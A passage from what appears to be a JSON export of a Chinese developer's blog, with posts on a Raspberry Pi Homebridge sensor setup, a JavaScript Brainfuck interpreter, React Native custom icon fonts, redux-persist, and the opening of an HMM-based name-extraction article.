apt-get install pigpio python-pigpio python3-pigpiosudo cp dht22 /usr/local/bin/dht22sudo chmod a+x /usr/local/bin/dht22dht22\n\n如果看到显示正常的温度，如\npi@hassbian:~ $ dht220 25.5 C 14.5 %\n\n智能电视因为我家有一台三星的智能电视，也可以用homebridge控制，在npm上找到了相应的包，迅速安装，迅速安装\nnpm install -g homebridge-samsungtv2016\n\n\n\n配置文件随后我们配置homebridge\ncd ~cd .homebridgevi config.json\n\n编辑内容：\n&#123;    &quot;bridge&quot;: &#123;        &quot;name&quot;: &quot;Yifan Home&quot;,        &quot;username&quot;: &quot;CC:22:3D:E3:CE:30&quot;,        &quot;port&quot;: 51826,        &quot;pin&quot;: &quot;031-45-154&quot;    &#125;,    &quot;description&quot;: &quot;Yifan Home&quot;,    &quot;accessories&quot;: [        &#123;           &quot;accessory&quot;: &quot;Dht&quot;,           &quot;name&quot;: &quot;dht22&quot;,           &quot;name_temperature&quot;: &quot;Temperature&quot;,           &quot;name_humidity&quot;: &quot;Humidity&quot;,           &quot;service&quot;: &quot;dht22&quot;,           &quot;gpio&quot;: &quot;4&quot;        &#125;,        &#123;                        &quot;accessory&quot;: &quot;SamsungTV2016&quot;,                        &quot;name&quot;: &quot;Bedroom TV&quot;,                        &quot;ip_address&quot;: &quot;192.168.1.8&quot;,                        &quot;mac_address&quot;: &quot;84:A4:66:F1:C7:09&quot;                &#125;    ],    &quot;platforms&quot;: [        ]&#125;\n\n最后，我们打上homebridge，打开手机的家庭.app，扫描二维码，添加设备，大功告成！\n小提示：\n\n如果之前添加错误，想重新配置，请进入~/.homebridge文件夹删除accessories和persist目录即可重新配置。\n\n参考https://home-assistant.io/docs/installation/hassbian/installation/\nhttps://www.jianshu.com/p/ec79b2711bd5\nhttp://www.instructables.com/id/RPIHomeBridge-TemperatureHumidity-Sensor/\n","categories":["Raspberry"],"tags":["Raspberry"]},{"title":"Brainfuck语言解释器Web版与移动客户端版 beta","url":"http://www.yfgeek.com/2017/11/30/Brainfuck语言解释器web版与移动客户端发布了/","content":"其实不是多难的东西，有了上文快速撸出一个Brainfuck语言解释器的核心解释器源码做基础，做两个客户端版本并不难。\n用React+Redux撸了一个Web版，一个移动版。两者都尚未完成，但是在同时进行。\n用React persist使数据持久化，也就是说即使你关闭了浏览器，下次不清空缓存的话，程序依然会为你保存。\n开源开源地址如下：\nBeef(移动版): https://github.com/yfgeek/Beef-react-native\nBrainfuckIDE(Web版):https://github.com/yfgeek/BrainfuckIDE\n图鉴\n\n","categories":["Brainfuck React-Native React"],"tags":["Brainfuck"]},{"title":"快速撸出一个Brainfuck语言解释器","url":"http://www.yfgeek.com/2017/11/30/快速撸出一个Brianfuck语言解释器/","content":"一直都知道一个很有趣的语言，Brainfuck，只是一直尚未研究，今天晚上看了一下，竟然不是那么难，而且还撸出来了一个解释器。这是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。\n就象它的名字所暗示的，brainfuck程序很难读懂。尽管如此，brainfuck图灵机一样可以完成任何计算任务。虽然brainfuck的计算方式如此与众不同，但它确实能够正确运行。\n这种语言基于一个简单的机器模型，除了指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针（初始时指向数组的第一个字节）、以及用于输入输出的两个字节流。\n下面是这八种状态的描述，其中每个状态由一个字符标识：\n\n\n\n字符\n含义\n\n\n\n&gt;\n指针加一\n\n\n&lt;\n指针减一\n\n\n+\n指针指向的字节的值加一\n\n\n-\n指针指向的字节的值减一\n\n\n.\n输出指针指向的单元内容（ASCII码）\n\n\n,\n输入内容到指针指向的单元（ASCII码）\n\n\n[\n如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处\n\n\n]\n如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处\n\n\n举个例子，hello world\n\n\n自己看下原理并不难，于是自己撸了一个解释器，话不多说直接上代码，用es6写的。\n/** * Brainfuck Interpreter * author: yfgeek * https://github.com/yfgeek */&#x27;use strict&#x27;;class Interpreter&#123;    constructor(code,input) &#123;        this.code = code.trim().replace(/ /g, &quot;&quot;).replace(/(\\r\\n|\\n|\\r)/gm,&quot;&quot;).split(&quot;&quot;);        this.input = input || [];        this.pointer = 0;        this.codePointer = 0 ;        this.dataset = [];        this.bracketStack = [];        this.output = [];    &#125;    operation(str)&#123;        switch(str)&#123;            case &#x27;+&#x27;:  &#123;                this.dataset[this.pointer] = this.dataset[this.pointer] || 0;                ++this.dataset[this.pointer];                break;            &#125;            case  &#x27;-&#x27;:  &#123;                this.dataset[this.pointer] = this.dataset[this.pointer] || 0;                --this.dataset[this.pointer];                break;            &#125;            case  &#x27;&lt;&#x27;:&#123;                this.pointer = --this.pointer&lt;0 ? 0: this.pointer;                break;            &#125;            case &#x27;&gt;&#x27;: &#123;                this.pointer++;                break;            &#125;            case &#x27;.&#x27;:&#123;                this.output.push(String.fromCharCode(this.dataset[this.pointer]));                break;            &#125;            case &#x27;,&#x27;:&#123;                let c = this.input.shift();                if (typeof c === &quot;string&quot;) &#123;                    this.dataset[this.pointer] = c.charCodeAt(0);                &#125;                break;            &#125;            case &#x27;[&#x27;: &#123;                this.leftBracket();                break;            &#125;            case &#x27;]&#x27;: &#123;                this.rightBracket();                break;            &#125;        &#125;    &#125;;    leftBracket()&#123;        let openBrackets = 1;        if (this.dataset[this.pointer]) &#123;            this.bracketStack.push(this.codePointer);        &#125; else &#123;            while (openBrackets &amp;&amp; this.code[++this.codePointer]) &#123;                if (this.code[this.codePointer] === &#x27;]&#x27;) &#123;                    openBrackets--;                &#125; else if (this.code[this.codePointer] === &#x27;[&#x27;) &#123;                    openBrackets++;                &#125;            &#125;        &#125;    &#125;    rightBracket()&#123;        this.codePointer =  this.bracketStack.pop() - 1;    &#125;    run()&#123;        let list = [&#x27;+&#x27;,&#x27;-&#x27;,&#x27;&lt;&#x27;,&#x27;&gt;&#x27;,&#x27;.&#x27;,&#x27;,&#x27;,&#x27;[&#x27;,&#x27;]&#x27;];        do&#123;           let c = this.code[this.codePointer];           if(list.indexOf(c) &gt;= 0)  this.operation(c);        &#125;while(++this.codePointer &lt; this.code.length);        return this.output;    &#125;    toString()&#123;        return this.run().join(&#x27;&#x27;);    &#125;&#125;let code = &#x27;++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.&#x27;;let i = new Interpreter(code,[]);console.log(i.toString());\n\n","categories":["Brainfuck React-Native"],"tags":["Brainfuck"]},{"title":"React Native 封装彩色自定义图标库","url":"http://www.yfgeek.com/2017/11/21/React-Native-封装彩色自定义图标库/","content":"问题描述本文接上篇React Native 添加自定义图标库，上篇介绍的很基础，但是有没有发现一个问题，通过这种react-native-vector-icons方式封装下来的图标，都只有黑白图标，颜色需要自己手动设置，但是对于我这种彩色绚丽的图标，手动设置？不存在的…\n\n那么本文就在上文的基础上讲讲，我是如何办到的自动彩色图标。\n答题思路是创建一个色彩配置文件，等到加载的时候，按照标签去加载。\n我Google了一圈，都找不到怎么让他自动加载色彩，可能是我搜索的姿势不对吧。\n\n文件处理首先，我们在IcoMoon先上传并下载一份黑色底色的图标文件，再上传并下载一份彩色底色图标文件。\n我们提取出黑色底色图标文件中的icomoon.ttf替换掉Xcode中的文件。\n与此同时，找到下载的彩色压缩包中找到selection.json这个神奇的文件，如果你上传的是彩色图标，实际上，里面内置了所有图标的色彩。\n短暂的例子如下：\n&#123;  &quot;IcoMoonType&quot;: &quot;selection&quot;,  &quot;icons&quot;: [    &#123;      &quot;icon&quot;: &#123;        &quot;paths&quot;: [          &quot;M1024 512c0 282.77-229.23 512-512 512s-512-229.23-512-512c0-282.77 229.23-512 512-512s512 229.23 512 512z&quot;,          &quot;M495.864 864c-8.635-0.904-17.283-1.694-25.902-2.735-46.907-5.658-90.865-20.248-131.905-43.628-0.617-0.351-1.173-0.807-2.359-1.631 70.607-52.759 140.878-105.267 211.541-158.068 7.173 6.99 14.228 13.852 21.267 20.732 11.824 11.554 23.75 23.006 35.372 34.761 2.857 2.888 4.938 2.843 8.321 1.13 35.662-18.047 64.813-43.452 87.298-76.484 1.076-1.581 2.141-3.168 3.409-5.046 1.007 1.154 1.922 2.078 2.695 3.109 24.557 32.675 49.065 65.386 73.707 97.999 2.131 2.82 1.861 4.498-0.394 7.058-57.072 64.811-127.961 104.761-213.416 118.423-10.764 1.721-21.699 2.371-32.551 3.556-1.443 0.158-2.861 0.543-4.29 0.823h-32.795zM526.886 160c5.987 0.602 11.972 1.234 17.963 1.801 50.406 4.768 97.579 19.719 141.532 44.82 0.618 0.352 1.171 0.814 2.239 1.567-71.758 51.465-143.179 102.689-215 154.198-2.819-2.673-5.592-5.243-8.299-7.879-15.124-14.723-30.288-29.405-45.288-44.253-2.404-2.379-4.231-2.644-7.231-1.144-36.318 18.15-65.87 43.969-88.618 77.568-0.824 1.217-1.649 2.433-3.243 4.784-26.391-35.161-52.444-69.873-78.959-105.2 7.959-8.447 15.318-16.848 23.29-24.622 51.948-50.658 113.581-82.88 185.050-95.845 13.759-2.496 27.819-3.324 41.737-4.951 1.575-0.184 3.129-0.559 4.692-0.845h30.136zM206.697 337.1c53.619 70.288 106.656 139.809 159.841 209.528-10.847 11.122-21.55 22.105-32.261 33.079-8.040 8.239-16.003 16.557-24.194 24.644-2.32 2.291-2.398 4.063-0.994 6.878 18.102 36.324 43.942 65.848 77.544 88.614 1.099 0.745 2.21 1.473 3.287 2.248 0.204 0.146 0.275 0.477 0.859 1.567-34.561 25.915-69.228 51.909-104.355 78.248-62.384-53.699-102.894-119.92-119.15-200.203-17.409-85.972-3.298-167.187 39.424-244.603zM660.291 476.931c9.953-10.34 19.655-20.426 29.366-30.502 8.192-8.501 16.277-17.112 24.668-25.413 2.611-2.584 2.571-4.525 1.042-7.607-18.248-36.766-44.326-66.643-78.406-89.551-1.189-0.8-2.338-1.656-4.339-3.078 35.118-26.354 69.777-52.362 104.912-78.728 59.438 50.901 98.889 113.583 117.002 189.265 22.608 94.462 2.47 187.911-36.701 253.699-52.442-69.266-104.8-138.42-157.545-208.086z&quot;        ],        &quot;attrs&quot;: [          &#123;            &quot;fill&quot;: &quot;rgb(48, 44, 44)&quot;          &#125;,          &#123;            &quot;fill&quot;: &quot;rgb(255, 255, 255)&quot;          &#125;        ],        &quot;isMulticolor&quot;: true,        &quot;isMulticolor2&quot;: false,        &quot;grid&quot;: 0,        &quot;tags&quot;: [          &quot;x&quot;        ]      &#125;,      &quot;attrs&quot;: [        &#123;          &quot;fill&quot;: &quot;rgb(48, 44, 44)&quot;        &#125;,        &#123;          &quot;fill&quot;: &quot;rgb(255, 255, 255)&quot;        &#125;      ],      &quot;properties&quot;: &#123;        &quot;order&quot;: 3,        &quot;id&quot;: 66,        &quot;name&quot;: &quot;x&quot;,        &quot;prevSize&quot;: 32,        &quot;code&quot;: 59648,        &quot;codes&quot;: [          59648,          59649        ]      &#125;,      &quot;setIdx&quot;: 0,      &quot;setId&quot;: 2,      &quot;iconIdx&quot;: 0    &#125;,    &#123;...&#125;,   &#125;&#125;\n\n我们分析一下这个文件，不难看出，icons下包含一个数组，每个数组代表每一个图标，每一个数组下都包含属性tags[0],attrs[0].fill分别代表对应的标签及色彩。\n这个时候，我们需要构建一个自己的色彩配置文件，把刚刚的有用的信息提取出来，具体的按照自己需求，定义标签名字和颜色。\nlet data = require(&#x27;./selection.json&#x27;);let arr = [];data.icons.forEach((item)=&gt;&#123;\tarr.push(\t&#123;\t\t&#x27;cuy&#x27; : item.icon.tags[0],\t\t&#x27;color&#x27; :item.icon.attrs[0].fill,\t&#125;)&#125;);console.log(arr);\n\n把输出的信息复制到新的文件，并将其命名config.js\nexport const ColorConfig = [    &#123; cuy: &#x27;x&#x27;, color: &#x27;rgb(48, 44, 44)&#x27; &#125;,    &#123; cuy: &#x27;ada&#x27;, color: &#x27;rgb(60, 200, 200)&#x27; &#125;,    &#123; cuy: &#x27;amp&#x27;, color: &#x27;rgb(45, 174, 228)&#x27; &#125;,    &#123; cuy: &#x27;ant&#x27;, color: &#x27;rgb(44, 211, 225)&#x27; &#125;,    &#123; cuy: &#x27;ardr&#x27;, color: &#x27;rgb(60, 135, 199)&#x27; &#125;,    &#123; cuy: &#x27;ark&#x27;, color: &#x27;rgb(247, 0, 0)&#x27; &#125;,    &#123; cuy: &#x27;bat&#x27;, color: &#x27;rgb(255, 80, 0)&#x27; &#125;,    &#123; cuy: &#x27;bcc&#x27;, color: &#x27;rgb(247, 147, 28)&#x27; &#125;,    &#123; cuy: &#x27;bch&#x27;, color: &#x27;rgb(247, 147, 26)&#x27; &#125;,    &#123; cuy: &#x27;bcn&#x27;, color: &#x27;rgb(240, 64, 134)&#x27; &#125;,    &#123; cuy: &#x27;bnb&#x27;, color: &#x27;rgb(243, 186, 47)&#x27; &#125;,    &#123; cuy: &#x27;btc&#x27;, color: &#x27;rgb(247, 147, 26)&#x27; &#125;,    &#123; cuy: &#x27;btcd&#x27;, color: &#x27;rgb(255, 102, 0)&#x27; &#125;,    &#123; cuy: &#x27;bts&#x27;, color: &#x27;rgb(53, 186, 235)&#x27; &#125;,    &#123; cuy: &#x27;dash&#x27;, color: &#x27;rgb(28, 117, 188)&#x27; &#125;,    &#123; cuy: &#x27;dcr&#x27;, color: &#x27;rgb(46, 214, 161)&#x27; &#125;,    &#123; cuy: &#x27;dgb&#x27;, color: &#x27;rgb(0, 106, 210)&#x27; &#125;,    &#123; cuy: &#x27;dgd&#x27;, color: &#x27;rgb(244, 208, 41)&#x27; &#125;,    &#123; cuy: &#x27;doge&#x27;, color: &#x27;rgb(195, 166, 52)&#x27; &#125;,    &#123; cuy: &#x27;emc&#x27;, color: &#x27;rgb(180, 159, 252)&#x27; &#125;,    &#123; cuy: &#x27;eos&#x27;, color: &#x27;rgb(180, 159, 252)&#x27; &#125;,    &#123; cuy: &#x27;etc&#x27;, color: &#x27;rgb(102, 144, 115)&#x27; &#125;,    &#123; cuy: &#x27;eth&#x27;, color: &#x27;rgb(98, 126, 234)&#x27; &#125;,    &#123; cuy: &#x27;fct&#x27;, color: &#x27;rgb(65, 123, 164)&#x27; &#125;,    &#123; cuy: &#x27;game&#x27;, color: &#x27;rgb(152, 192, 31)&#x27; &#125;,    &#123; cuy: &#x27;gbyte&#x27;, color: &#x27;rgb(48, 44, 44)&#x27; &#125;,    &#123; cuy: &#x27;gno&#x27;, color: &#x27;rgb(0, 166, 196)&#x27; &#125;,    &#123; cuy: &#x27;gnt&#x27;, color: &#x27;rgb(0, 29, 87)&#x27; &#125;,    &#123; cuy: &#x27;hsr&#x27;, color: &#x27;rgb(86, 66, 142)&#x27; &#125;,    &#123; cuy: &#x27;icn&#x27;, color: &#x27;rgb(76, 111, 140)&#x27; &#125;,    &#123; cuy: &#x27;kmd&#x27;, color: &#x27;rgb(50, 100, 100)&#x27; &#125;,    &#123; cuy: &#x27;knc&#x27;, color: &#x27;rgb(24, 140, 146)&#x27; &#125;,    &#123; cuy: &#x27;lkk&#x27;, color: &#x27;rgb(157, 1, 235)&#x27; &#125;,    &#123; cuy: &#x27;lsk&#x27;, color: &#x27;rgb(2, 136, 209)&#x27; &#125;,    &#123; cuy: &#x27;ltc&#x27;, color: &#x27;rgb(203, 198, 198)&#x27; &#125;,    &#123; cuy: &#x27;maid&#x27;, color: &#x27;rgb(85, 146, 215)&#x27; &#125;,    &#123; cuy: &#x27;miota&#x27;, color: &#x27;rgb(36, 36, 36)&#x27; &#125;,    &#123; cuy: &#x27;mln&#x27;, color: &#x27;rgb(11, 21, 41)&#x27; &#125;,    &#123; cuy: &#x27;mona&#x27;, color: &#x27;rgb(240, 219, 176)&#x27; &#125;,    &#123; cuy: &#x27;neo&#x27;, color: &#x27;rgb(0, 0, 0)&#x27; &#125;,    &#123; cuy: &#x27;nlg&#x27;, color: &#x27;rgb(42, 176, 253)&#x27; &#125;,    &#123; cuy: &#x27;nmc&#x27;, color: &#x27;rgb(24, 108, 157)&#x27; &#125;,    &#123; cuy: &#x27;nxt&#x27;, color: &#x27;rgb(0, 143, 187)&#x27; &#125;,    &#123; cuy: &#x27;omg&#x27;, color: &#x27;rgb(26, 83, 240)&#x27; &#125;,    &#123; cuy: &#x27;pay&#x27;, color: &#x27;rgb(48, 44, 44)&#x27; &#125;,    &#123; cuy: &#x27;pivx&#x27;, color: &#x27;rgb(94, 71, 120)&#x27; &#125;,    &#123; cuy: &#x27;pot&#x27;, color: &#x27;rgb(16, 91, 47)&#x27; &#125;,    &#123; cuy: &#x27;ppc&#x27;, color: &#x27;rgb(60, 176, 84)&#x27; &#125;,    &#123; cuy: &#x27;ppt&#x27;, color: &#x27;rgb(21, 39, 67)&#x27; &#125;,    &#123; cuy: &#x27;qtum&#x27;, color: &#x27;rgb(46, 154, 208)&#x27; &#125;,    &#123; cuy: &#x27;rep&#x27;, color: &#x27;rgb(96, 42, 82)&#x27; &#125;,    &#123; cuy: &#x27;salt&#x27;, color: &#x27;rgb(27, 238, 244)&#x27; &#125;,    &#123; cuy: &#x27;sc&#x27;, color: &#x27;rgb(0, 203, 160)&#x27; &#125;,    &#123; cuy: &#x27;sngls&#x27;, color: &#x27;rgb(179, 13, 35)&#x27; &#125;,    &#123; cuy: &#x27;steem&#x27;, color: &#x27;rgb(75, 162, 242)&#x27; &#125;,    &#123; cuy: &#x27;strat&#x27;, color: &#x27;rgb(19, 135, 201)&#x27; &#125;,    &#123; cuy: &#x27;trx&#x27;, color: &#x27;rgb(0, 0, 0)&#x27; &#125;,    &#123; cuy: &#x27;usdt&#x27;, color: &#x27;rgb(38, 161, 123)&#x27; &#125;,    &#123; cuy: &#x27;vtc&#x27;, color: &#x27;rgb(53, 99, 62)&#x27; &#125;,    &#123; cuy: &#x27;waves&#x27;, color: &#x27;rgb(0, 150, 220)&#x27; &#125;,    &#123; cuy: &#x27;xcp&#x27;, color: &#x27;rgb(237, 22, 80)&#x27; &#125;,    &#123; cuy: &#x27;xem&#x27;, color: &#x27;rgb(103, 178, 232)&#x27; &#125;,    &#123; cuy: &#x27;xlm&#x27;, color: &#x27;rgb(20, 182, 231)&#x27; &#125;,    &#123; cuy: &#x27;xmr&#x27;, color: &#x27;rgb(255, 102, 0)&#x27; &#125;,    &#123; cuy: &#x27;xrp&#x27;, color: &#x27;rgb(0, 170, 228)&#x27; &#125;,    &#123; cuy: &#x27;xtz&#x27;, color: &#x27;rgb(166, 224, 0)&#x27; &#125;,    &#123; cuy: &#x27;zec&#x27;, color: &#x27;rgb(236, 178, 68)&#x27; &#125;    ];\n\n这样，色彩配置文件封装好了。\n加载色彩按照上文所做，我们封装出自己的图标库，当调用到图标组建的时候，我们这么加载它：\n import &#123;ColorConfig&#125; from &#x27;../icon/config&#x27;;render()&#123;let color = &#x27;#f5922f&#x27;;ColorConfig.forEach((item,index)=&gt;&#123;if(item.cuy === cuy)  color = item.color&#125;);  return &lt;Icon name=&#123;cuy&#125; size=&#123;48&#125; color=&#123;color&#125;/&gt;;&#125;\n\n补全镂空理论上现在就结束了，但是我发现了这样做的一个问题，如图所示\n\n其实解决这个问题相当简单，只需要多加一层View，并将其底色设置为白色，切角设置为50%的圆（web端思路）\n但是，在实际运用的时候，发现borderRadius无法设置为50%，其实也不难，代码如下\nimport &#123;ColorConfig&#125; from &#x27;../icon/config&#x27;;render()&#123;let color = &#x27;#f5922f&#x27;;let w = this.props.width || 48;ColorConfig.forEach((item,index)=&gt;&#123;if(item.cuy === cuy)  color = item.color&#125;);  return (                &lt;View style=&#123;&#123;                    alignItems:&#x27;center&#x27;,                    justifyContent:&#x27;center&#x27;,                    borderRadius: w/2,                    overflow: &#x27;hidden&#x27;,                    backgroundColor : &#x27;#ffffff&#x27;,                &#125;&#125;&gt;                   &lt;Icon name=&#123;cuy&#125; size=&#123;w&#125; color=&#123;color&#125;/&gt;;                &lt;/View&gt;        )&#125;\n\n再看看效果，完美！\n\n\n效率问题这样手动封装的库，实际上会引发一些效率问题，比如在加载众多组建的时候，每一个组件都会重新读取一边色彩配置文件，并将其放入内存，实际上意义不大，浪费时间。\n实际上，我们可以把色彩配置文件和selection.json一并放在store中，或者放在最顶层的组件的state中，或者存成hashmap形式，内存只需要加载一次配置文件就够了。\nAnyway，这种方法有待优化，但是对于图标数量比较小的APP来说，优化的意义不大。\n","categories":["React-Native"],"tags":["React-Native"]},{"title":"React Native 添加自定义图标库","url":"http://www.yfgeek.com/2017/11/20/React-Native-添加自定义图标库/","content":"最近在开发一个React Native小程序，遇到了很多问题，好在都解决了，近期将逐步增加一些解决问题式文章，方便各位网友学习，如有不对，请多指教！\n本文讲述用react-native-vector-icons库，封装一个自己的图标库，也就是说添加自定义图标库，下面讲讲如何添加。\n通俗易懂，而且本文只讲一种方式，方便各位网友学习，我讲的方式就是最简单的createIconSetFromIcoMoon方法。\n第一步，准备好你的素材，最好是svg格式\n第二步，进入网址：https://icomoon.io/app/#/select\n点击Import Icons按钮，将图标批量导入，如图下所示：\n\n第三步，点击Generate Font按钮。\n第四步，点击Download按钮。\n这时候，你会下载到如图所示结构的zip文件，将其解压，拷贝到项目根目录。\n\n第五步，在Xcode中添加压缩包里的icomoon.ttf文件。\n用Xcode打开工程文件，将icomoon.ttf文件复制一份，并拖动到Resources目录中，如图所示\n\n第六步，点开Info.plist，在Fonts provided by application属性中添加这个字体的名称icomoon.ttf的键值。\n\n第七步，在项目配置中的Build Phases中的Copy Bundle Resources 中添加该字体。\n\n第七步，在项目根目录下，运行终端命令：\nnpm install react-native-vector-icons --savereact-native link\n\n\n第八步，配置安卓：\n编辑 android/app/build.gradle ，添加如下内容，可以说非常简单\nproject.ext.vectoricons = [    iconFontNames: [ &#x27;icomoon.ttf&#x27;] ]apply from: &quot;../../node_modules/react-native-vector-icons/fonts.gradle&quot;\n\n第八步，在代码中写：\nimport &#123;createIconSetFromIcoMoon &#125; from &#x27;react-native-vector-icons&#x27;;import icoMoonConfig from &#x27;../icon/selection.json&#x27;;const Icon = createIconSetFromIcoMoon(icoMoonConfig);export default Iconfontello;\n\n第九步，作为组件调用\n&lt;Icon name=&quot;btc&quot; size=&#123;32&#125; /&gt;;\n\n","categories":["React-Native"],"tags":["React-Native"]},{"title":"轻松几步让Redux实现数据持久化","url":"http://www.yfgeek.com/2017/11/19/轻松几步让Redux实现数据持久化/","content":"在开发的过程中，数据用redux管理，觉得希望将数据持久化保存，也就是说当用户下一次打开app或网站的时候，我们希望浏览器/APP自动加载出上次的数据，怎么办？有没有一个🙆‍♂统一的方式？\n有的，这就是简单易用的redux-persist，事情比想象的简单太多了。\n话不多说，上代码！官方示例代码：\nimport &#123; PersistGate &#125; from &#x27;redux-persist/es/integration/react&#x27;import configureStore from &#x27;./store/configureStore&#x27;const &#123; persistor, store &#125; = configureStore()const onBeforeLift = () =&gt; &#123;  // take some action before the gate lifts&#125;export default () =&gt; (  &lt;Provider store=&#123;store&#125;&gt;    &lt;PersistGate       loading=&#123;&lt;Loading /&gt;&#125;      onBeforeLift=&#123;onBeforeLift&#125;      persistor=&#123;persistor&#125;&gt;      &lt;App /&gt;    &lt;/PersistGate&gt;  &lt;/Provider&gt;)\n\n首先你的结构应该是拥有reducers的，在我的代码中，我还加入了redux-thunk中间件，如果你不懂，可以忽略这个。\n import React, &#123; Component &#125; from &#x27;react&#x27;;\t\t import &#123;AppRegistry&#125; from &#x27;react-native&#x27;;\t\t import &#123; createStore ,applyMiddleware &#125; from &#x27;redux&#x27; import &#123; Provider &#125; from &#x27;react-redux&#x27;\t\t import App from &quot;./src/App&quot;;\t\t import reducers from &#x27;./src/reducers/reducers&#x27;\t import thunk from &#x27;redux-thunk&#x27;;\t\t export default class CoinOnline extends Component &#123;\t\t   render() &#123;     const store = createStore(App,applyMiddleware(thunk));\t     return (       &lt;Provider store=&#123;store&#125;&gt;        &lt;App /&gt;       &lt;/Provider&gt;\t\t       );     &#125; &#125;AppRegistry.registerComponent(&#x27;CoinOnline&#x27;, () =&gt; CoinOnline);       \n\n我是怎么应用的？\n第一步，引入我们需要的方法\nimport &#123;persistStore, persistCombineReducers&#125; from &#x27;redux-persist&#x27;;import &#123; PersistGate &#125; from &#x27;redux-persist/es/integration/react&#x27;;\n\n第二步，重新封装reducer，用persistCombineReducers()方法加载配置和reducer\nconst config = &#123;    key: &#x27;root&#x27;,    storage,&#125;;let reducer = persistCombineReducers(config, reducers);\n\n第三步，在redux的&lt;Provider&gt;&lt;/Provider&gt;内层嵌套&lt;PersistGate&gt;&lt;/PersistGate&gt;\n  &lt;Provider store=&#123;store&#125;&gt;                &lt;PersistGate persistor=&#123;persistor&#125;&gt;                    &lt;App /&gt;                &lt;/PersistGate&gt;&lt;/Provider&gt;\n\n轻松三步，简单吧！话不多说直接上代码\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;    AppRegistry,&#125; from &#x27;react-native&#x27;;import &#123; createStore ,applyMiddleware, compose &#125; from &#x27;redux&#x27;import &#123; Provider &#125; from &#x27;react-redux&#x27;import App from &quot;./src/App&quot;;import reducers from &#x27;./src/reducers/reducers&#x27;import thunk from &#x27;redux-thunk&#x27;;import &#123;persistStore, persistCombineReducers&#125; from &#x27;redux-persist&#x27;;import &#123; PersistGate &#125; from &#x27;redux-persist/es/integration/react&#x27;;import storage from &#x27;redux-persist/es/storage&#x27; // default: localStorage if web, AsyncStorage if react-nativeconst config = &#123;    key: &#x27;root&#x27;,    storage,&#125;;function configureStore()&#123;    let reducer = persistCombineReducers(config, reducers);    let store = createStore(reducer, applyMiddleware(thunk));    let persistor = persistStore(store);    return &#123; persistor, store &#125;&#125;export default class CoinOnline extends Component &#123;    render() &#123;        const &#123; persistor, store &#125; = configureStore();        return (            &lt;Provider store=&#123;store&#125;&gt;                &lt;PersistGate persistor=&#123;persistor&#125;&gt;                    &lt;App /&gt;                &lt;/PersistGate&gt;            &lt;/Provider&gt;        );    &#125;&#125;AppRegistry.registerComponent(&#x27;CoinOnline&#x27;, () =&gt; CoinOnline);\n\n多说一句，如果createStore有需要加载多个参数，需要用compose将其拼装起来。\n比如在测试时我还使用了remote-redux-devtools调试神器，代码如下\nlet store = createStore(reducer, compose(applyMiddleware(thunk),devToolsEnhancer(&#123; realtime: true, port: 8000 &#125;)));\n\n下次，每次启动之前redux-persit都会默认先dispatch两个动作\nPERSIT和REHYDRATE，会把上一次的redux中的states注入到当前组件中，即完成了持久化。\n\n\n","categories":["Redux  React Redux"],"tags":["React-Native"]},{"title":"“我是如何收集校友的”之利用基于HMM-Viterbi的HanLP进行人名提取","url":"http://www.yfgeek.com/2017/11/15/“我是如何收集校友的”之利用基于HMM-Viterbi的HanLP进行人名提取/","content":"最近在做一个小APP，一直没有来的及更新这个系列的文章，是为抱歉。按照上文讲到，我们已经将数据重复的内容用pandas库去掉了，接下来将干一件难度很大的事情，那就是对人名进行提取。\n\n我们当前进度：3\n\n爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据\n数据去重——用pandas去掉抓取相同的URL或相同的名称\n提取人名——利用HMM-Viterbi进行人名筛选与提取\n下载器——下载所有数据库中数据清洗过的URL，并存入数据库\n人物Ranking——按照一定的排名方式，对人物进行知名度排名\n人物梗概——利用NLP相关库，对提取的人物进行自动化梗概\n\n关于人名提取，说白了，就是每一个字段（标题）就是一句话，我们对这句话进行语法词性分析，提出其主语部分，其实质是一个NLP的应用问题。\n关于HMM-Viterbi算法，这里有一篇论文介绍。下面本文引用一篇讲的很好很透彻的文章节选(引用自一文搞懂HMM（隐马尔可夫模型）)，里面的文字讲的很清晰很透彻了。本来想自己总结一下，但是感觉有些班门弄斧，索性直接引用。\nHMM（隐马尔可夫模型）隐马尔可夫模型（Hidden Markov Model，HMM）是统计模型，它用来描述一个含有隐含未知参数的马尔可夫过程。其难点是从可观察的参数中确定该过程的隐含参数。然后利用这些参数来作进一步的分析，例如模式识别。\n是在被建模的系统被认为是一个马尔可夫过程与未观测到的（隐藏的）的状态的统计马尔可夫模型。\n下面用一个简单的例子来阐述：\n假设我手里有三个不同的骰子。第一个骰子是我们平常见的骰子（称这个骰子为D6），6个面，每个面（1，2，3，4，5，6）出现的概率是1/6。第二个骰子是个四面体（称这个骰子为D4），每个面（1，2，3，4）出现的概率是1/4。第三个骰子有八个面（称这个骰子为D8），每个面（1，2，3，4，5，6，7，8）出现的概率是1/8。\n\n假设我们开始掷骰子，我们先从三个骰子里挑一个，挑到每一个骰子的概率都是1/3。然后我们掷骰子，得到一个数字，1，2，3，4，5，6，7，8中的一个。不停的重复上述过程，我们会得到一串数字，每个数字都是1，2，3，4，5，6，7，8中的一个。例如我们可能得到这么一串数字（掷骰子10次）：1 6 3 5 2 7 3 5 2 4\n这串数字叫做可见状态链。但是在隐马尔可夫模型中，我们不仅仅有这么一串可见状态链，还有一串隐含状态链。在这个例子里，这串隐含状态链就是你用的骰子的序列。比如，隐含状态链有可能是：D6 D8 D8 D6 D4 D8 D6 D6 D4 D8\n一般来说，HMM中说到的马尔可夫链其实是指隐含状态链，因为隐含状态（骰子）之间存在转换概率（transition probability）。在我们这个例子里，D6的下一个状态是D4，D6，D8的概率都是1/3。D4，D8的下一个状态是D4，D6，D8的转换概率也都一样是1/3。这样设定是为了最开始容易说清楚，但是我们其实是可以随意设定转换概率的。比如，我们可以这样定义，D6后面不能接D4，D6后面是D6的概率是0.9，是D8的概率是0.1。这样就是一个新的HMM。\n同样的，尽管可见状态之间没有转换概率，但是隐含状态和可见状态之间有一个概率叫做输出概率（emission 